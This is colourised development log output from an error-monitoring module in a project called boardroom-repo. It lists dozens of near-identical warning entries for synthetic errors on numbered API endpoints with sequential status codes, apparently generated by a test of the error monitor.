WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1018'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1019'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740186Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1020'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740245Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1021'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740298Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1022'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1023'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1024'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1025'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740509Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1026'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740559Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1027'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740609Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1028'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1029'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740708Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1030'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1031'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1032'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1033'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740903Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1034'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.740952Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1035'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1036'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741117Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1037'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1038'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1039'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741281Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1040'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741330Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1041'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741380Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1042'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741429Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1043'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741477Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1044'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741525Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1045'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741573Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1046'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1047'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1048'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m21[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1049'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741768Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1050'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741824Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1051'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741883Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1052'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.741987Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1053'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1054'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1055'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742165Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1056'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1057'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
